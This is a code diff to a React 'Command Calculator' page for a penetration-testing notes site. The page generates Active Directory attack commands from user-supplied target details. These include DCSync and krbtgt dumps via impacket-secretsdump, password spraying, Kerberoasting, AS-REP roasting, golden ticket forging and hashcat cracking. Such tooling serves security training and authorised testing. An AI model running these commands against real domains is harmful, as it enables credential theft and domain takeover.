@@ -1,5 +1,4 @@
 import React, { useState, useMemo } from "react";
-import { nodes, PHASES } from "./utils/loadNodes";
 
 /**
  * Command Calculator — a standalone page for The Path.
@@ -75,7 +74,6 @@ export default function CommandCalculator() {
   const [authMode, setAuthMode] = useState("pw");
   const [active, setActive] = useState("setup");
   const [filter, setFilter] = useState("");
-  const [mode, setMode] = useState("curated"); // 'curated' | 'all'
 
   const set = (k) => (e) => setF((v) => ({ ...v, [k]: e.target.value }));
 
@@ -90,7 +88,6 @@ export default function CommandCalculator() {
   const LPORT = f.lport || "4444";
   const baseDN = f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>";
   const NB = f.domain ? (f.domain.split(".")[0] || "").toUpperCase() : "<NB>";
-  const SUBNET = f.ip ? f.ip.split(".").slice(0, 3).join(".") + ".0/24" : "<SUBNET>/24";
   const hostsLine = `${IP}\t${HOST} ${D} ${HOST.split(".")[0]}`;
 
   // target host: Kerberos demands the hostname, everything else the IP
@@ -99,13 +96,6 @@ export default function CommandCalculator() {
   // ── auth-aware fragment builders ────────────────────────
   const impTgt = (forceHost = false) => {
     const t = authMode === "krb" || forceHost ? HOST : IP;
-    if (authMode === "pw") return `'${D}/${U}:${SEC}@${t}'`;
-    if (authMode === "hash") return `'${D}/${U}@${t}' -hashes :${SEC}`;
-    return `'${D}/${U}@${t}' -k -no-pass -dc-ip ${DCIP}`;
-  };
-  // DC-targeted variant — DCSync / domain replication must hit the DC, not the box
-  const impDC = () => {
-    const t = authMode === "krb" ? HOST : DCIP;
     if (authMode === "pw") return `'${D}/${U}:${SEC}@${t}'`;
     if (authMode === "hash") return `'${D}/${U}@${t}' -hashes :${SEC}`;
     return `'${D}/${U}@${t}' -k -no-pass -dc-ip ${DCIP}`;
@@ -128,15 +118,9 @@ export default function CommandCalculator() {
           { label: "Export shell vars", cmd: `export IP=${IP} DC=${DCIP} DOMAIN=${D} USER='${U}'` },
         ]},
         { phase: "First-touch nmap", cmds: [
-          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 5000 -T4 -Pn ${IP} -oN allports.txt` },
-          { label: "Extract open ports → $PORTS", cmd: `grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,\n# Capture into a var to feed the next scan:\nPORTS=$(grep -E '^[0-9]+/tcp' allports.txt | awk '{print $1}' | cut -d '/' -f1 | paste -sd ,)`, note: "Output like 21,80,135,139,443,445 — feeds straight into -p below." },
-          { label: "Targeted -sCV on open ports", cmd: `sudo nmap -sC -sV -p $PORTS ${IP} -oN targeted.txt`, note: "Run after the line above sets $PORTS — no hand-typing ports." },
-          { label: "UDP top 20", cmd: `sudo nmap -sU --top-ports 20 -Pn ${IP} -oN udp.txt` },
-        ]},
-        { phase: "Subnet → live hosts (greppable)", cmds: [
-          { label: "Host discovery (-sn)", cmd: `nmap -sn ${SUBNET} -oG hosts.gnmap` },
-          { label: "Extract live IPs → live_hosts.txt", cmd: `grep Up hosts.gnmap | cut -d ' ' -f 2 > live_hosts.txt\ncat live_hosts.txt`, note: "Greppable -oG marks reachable hosts with 'Up' — pull column 2." },
-          { label: "Mass scan the live list", cmd: `nmap -iL live_hosts.txt -p- --min-rate 5000 -T4 -oG mass_scan.txt\ngrep open mass_scan.txt`, note: "Filter quick wins: grep -E '80|443|445|22|3389|5985' mass_scan.txt" },
+          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 2000 -Pn ${IP} -oN nmap/all.txt` },
+          { label: "Service + scripts on open ports", cmd: `sudo nmap -sCV -p PORTS ${IP} -oN nmap/svc.txt`, note: "Replace PORTS with the open ports from the sweep." },
+          { label: "UDP top ports", cmd: `sudo nmap -sU --top-ports 50 -Pn ${IP} -oN nmap/udp.txt` },
         ]},
       ],
     },
@@ -149,19 +133,19 @@ export default function CommandCalculator() {
           { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
         ]},
         { phase: "Credentials", cmds: [
-          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impDC()} -just-dc-ntlm -outputfile dcsync`, note: "Runs against the DC (uses DC IP), not the target box." },
-          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impDC()} -just-dc-user Administrator` },
-          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impDC()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
-          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}`, note: "Local dump — targets the box you have creds on." },
+          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-ntlm -outputfile dcsync` },
+          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user Administrator` },
+          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
+          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}` },
           { label: "Password spray (nxc)", cmd: `nxc smb ${IP} -u users.txt -p '${SEC}' --continue-on-success`, note: "Check --pass-pol first. One spray per lockout window." },
         ]},
         { phase: "Roasting", cmds: [
-          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting tgs.txt` },
+          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting kerb.txt` },
           { label: "Kerberoast (impacket)", cmd: authMode === "krb"
-            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile tgs.txt`
-            : `impacket-GetUserSPNs ${D}/${U}:'${SEC}' -dc-ip ${DCIP} -request -outputfile tgs.txt` },
+            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile kerb.txt`
+            : `impacket-GetUserSPNs ${D}/${U}:'${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
           { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
-          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep.txt`, note: "-format hashcat so it cracks with -m 18200." },
+          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -outputfile asrep.txt` },
         ]},
       ],
     },
@@ -209,9 +193,7 @@ export default function CommandCalculator() {
     kerberos: {
       name: "Kerberos", groups: [
         { phase: "Tickets", cmds: [
-          { label: "Request TGT", cmd: authMode === "hash"
-            ? `impacket-getTGT ${D}/${U} -hashes :${SEC} -dc-ip ${DCIP}`
-            : `impacket-getTGT ${D}/${U}:'${SEC}' -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
+          { label: "Request TGT", cmd: `impacket-getTGT ${D}/${U}:'${SEC}' -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
           { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
           { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
         ]},
@@ -308,13 +290,13 @@ export default function CommandCalculator() {
       name: "Hash Cracking", groups: [
         { phase: "hashcat modes", cmds: [
           { label: "NTLM (-m 1000)", cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt` },
-          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt` },
+          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt` },
           { label: "AS-REP (-m 18200)", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` },
           { label: "NetNTLMv2 (-m 5600)", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt` },
         ]},
       ],
     },
-  }), [authMode, f, baseDN, NB, SUBNET, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);
+  }), [authMode, f, baseDN, NB, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);
 
   // ── global filter across every service ──────────────────
   const q = filter.trim().toLowerCase();
@@ -331,68 +313,6 @@ export default function CommandCalculator() {
     }
     return out;
   }, [q, services]);
-
-  // ── All Path: every node, with your vars substituted in ──
-  // Replace The Path's placeholder conventions. Order matters: longer/more
-  // specific tokens first so $dcip isn't eaten by $ip, etc. Sequential
-  // .replace() calls mean each token is gone before the next runs.
-  const subPath = (text) => (text || "")
-    .replace(/\$dc_ip\b/gi, DCIP)
-    .replace(/\$dcip\b/gi, DCIP)
-    .replace(/\$target_ip\b/gi, IP)
-    .replace(/\$rhost\b/gi, IP)
-    .replace(/\$kali_ip\b/gi, LHOST)
-    .replace(/\bKALI_IP\b/g, LHOST)
-    .replace(/\bTARGET_IP\b/g, IP)
-    .replace(/\$lhost\b/gi, LHOST)
-    .replace(/\$lport\b/gi, LPORT)
-    .replace(/\$subnet\b/gi, SUBNET)
-    .replace(/\$range\b/gi, SUBNET)
-    .replace(/\$domain\b/gi, D)
-    .replace(/\$target\b/gi, IP)
-    .replace(/\$user\b/gi, U)
-    .replace(/\$pass\b/gi, SEC)
-    .replace(/\$ip\b/gi, IP);
-
-  const phaseOrder = Object.keys(PHASES);
-  const allPath = useMemo(() => {
-    const groups = {};
-    for (const [id, n] of Object.entries(nodes)) {
-      if (!n.cmd || !n.cmd.trim()) continue; // command-focused: skip prose-only nodes
-      const ph = n.phase || "OTHER";
-      (groups[ph] = groups[ph] || []).push({ id, ...n });
-    }
-    const ordered = [
-      ...phaseOrder.filter((p) => groups[p]),
-      ...Object.keys(groups).filter((p) => !phaseOrder.includes(p)),
-    ];
-    return ordered.map((p) => ({
-      phase: p,
-      color: (PHASES[p] || {}).color || "#7fb3ff",
-      icon: (PHASES[p] || {}).icon || "▪",
-      nodes: groups[p],
-    }));
-  }, [phaseOrder]);
-
-  const allNodeCount = useMemo(
-    () => allPath.reduce((n, g) => n + g.nodes.length, 0), [allPath]
-  );
-
-  const allFiltered = useMemo(() => {
-    if (mode !== "all") return null;
-    if (!q) return allPath;
-    return allPath
-      .map((g) => ({
-        ...g,
-        nodes: g.nodes.filter(
-          (n) =>
-            (n.title || "").toLowerCase().includes(q) ||
-            (n.body || "").toLowerCase().includes(q) ||
-            (n.cmd || "").toLowerCase().includes(q)
-        ),
-      }))
-      .filter((g) => g.nodes.length);
-  }, [mode, q, allPath]);
 
   const svc = services[active];
 
@@ -450,61 +370,20 @@ export default function CommandCalculator() {
         )}
       </div>
 
-      {/* MODE TOGGLE */}
-      <div className="mode-row">
-        <div className="mode-toggle">
-          <button className={`mode-btn${mode === "curated" ? " on" : ""}`} onClick={() => setMode("curated")}>
-            Curated
-          </button>
-          <button className={`mode-btn${mode === "all" ? " on" : ""}`} onClick={() => setMode("all")}>
-            All Path · {allNodeCount}
-          </button>
-        </div>
-        <span className="mode-hint">
-          {mode === "all"
-            ? "Every node from The Path, your vars substituted in."
-            : "Hand-tuned commands with the auth toggle."}
-        </span>
-      </div>
-
       {/* FILTER */}
       <div className="filter-wrap">
         <input
           className="filter"
           value={filter}
           onChange={(e) => setFilter(e.target.value)}
-          placeholder={mode === "all" ? "Search all Path nodes — title, body, or command…" : "Filter every binary — psexec, kerberoast, snmpwalk…"}
+          placeholder="Filter every binary — psexec, kerberoast, snmpwalk…"
           spellCheck={false}
         />
         {filter && <button className="filter-clear" onClick={() => setFilter("")}>clear</button>}
       </div>
 
       {/* CONTENT */}
-      {mode === "all" ? (
-        <div className="results">
-          {allFiltered.length === 0 ? (
-            <div className="empty">No Path node matches “{filter}”.</div>
-          ) : (
-            allFiltered.map((g) => (
-              <section key={g.phase} className="svc-block">
-                <h2 className="svc-name" style={{ color: g.color }}>
-                  <span style={{ marginRight: ".4rem" }}>{g.icon}</span>{g.phase}
-                  <span className="phase-count">{g.nodes.length}</span>
-                </h2>
-                <div className="cmd-list">
-                  {g.nodes.map((n) => (
-                    <div key={n.id} className="node">
-                      <div className="node-title">{n.title || n.id}</div>
-                      {n.body && <div className="node-body">{n.body}</div>}
-                      <CmdCard label={n.phase} cmd={subPath(n.cmd)} note={n.warn ? `⚠ ${n.warn}` : null} />
-                    </div>
-                  ))}
-                </div>
-              </section>
-            ))
-          )}
-        </div>
-      ) : filtered ? (
+      {filtered ? (
         <div className="results">
           {filtered.length === 0 ? (
             <div className="empty">No command matches “{filter}”. Try a binary name or flag.</div>
@@ -563,17 +442,6 @@ const css = `
   .cc-back:hover{color:var(--amber)}
   .cc-title{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.7rem;letter-spacing:-.01em;margin-top:.35rem;color:#eaf1f8}
   .cc-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem;letter-spacing:.02em}
-
-  .mode-row{max-width:1080px;margin:0 auto .8rem;display:flex;align-items:center;gap:.7rem;flex-wrap:wrap}
-  .mode-toggle{display:inline-flex;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:2px}
-  .mode-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.7rem;padding:.4rem .9rem;border-radius:6px;cursor:pointer;transition:all .12s}
-  .mode-btn:hover{color:var(--ink)}
-  .mode-btn.on{background:var(--accent);color:#06101e;font-weight:700}
-  .mode-hint{font-size:.62rem;color:var(--dim)}
-  .phase-count{margin-left:.5rem;font-size:.6rem;color:var(--dim);font-weight:400;letter-spacing:0}
-  .node{display:flex;flex-direction:column;gap:.3rem;padding:.2rem 0}
-  .node-title{font-size:.72rem;color:#cdd9e6;font-weight:500}
-  .node-body{font-size:.64rem;color:var(--dim);line-height:1.5}
 
   .varbar{position:sticky;top:0;z-index:20;max-width:1080px;margin:0 auto 1rem;
     background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:.9rem;
